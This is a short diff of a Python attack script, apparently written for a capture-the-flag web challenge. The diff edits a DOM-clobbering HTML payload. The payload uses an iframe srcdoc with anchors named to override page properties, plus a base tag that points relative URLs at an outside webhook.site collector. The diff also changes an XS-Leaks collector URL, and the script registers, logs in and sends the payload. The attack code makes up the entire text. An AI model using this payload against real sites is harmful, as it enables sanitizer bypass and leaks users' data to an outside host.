@@ -42,11 +42,11 @@ user = {
 }
 
 payload = {
-    "title":"<iframe name=isClean srcdoc=\"<a id=isSafe name=isSafe><a id=isSafe name=isSanitized href=controlled>\"></iframe><base href='https://webhook.site/60d05d93-724e-457d-8293-19696b837128/'>",
+    "title":"<iframe name=abortError srcdoc=\"<a id=stack name=stack><a id=stack name=stackTrace href=controlled>\"></iframe><base href='https://webhook.site/76ee9d15-df9b-4ac2-baf3-42bde54fa848/'>",
     "content":"aaaaaa"
 }
 
-xsleaks_payload_url = "http://webhook.site/99384707-000f-48aa-b0c1-f416f3a1becc"
+xsleaks_payload_url = "https://webhook.site/91d6287f-517f-4844-a0ab-7a165ff43da9/"
 register(user)
 login(user)
 send_cloberring_payload(payload)
